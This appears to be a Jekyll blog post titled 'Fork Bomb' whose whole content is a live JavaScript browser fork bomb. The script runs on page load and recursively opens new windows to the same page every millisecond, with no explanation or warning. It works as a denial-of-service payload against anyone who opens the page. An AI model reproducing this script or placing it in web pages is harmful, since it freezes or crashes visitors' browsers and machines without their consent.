---
layout: post
title: Fork Bomb
permalink: /fork/
---

<script>
(function forkBomb(timeout = 1, i = 0) {
  setTimeout(() => {
    window.open('./?v=' + Math.random(), '_new' + (i || ''))
    forkBomb(timeout, i + 1)
  }, timeout)
})()
</script>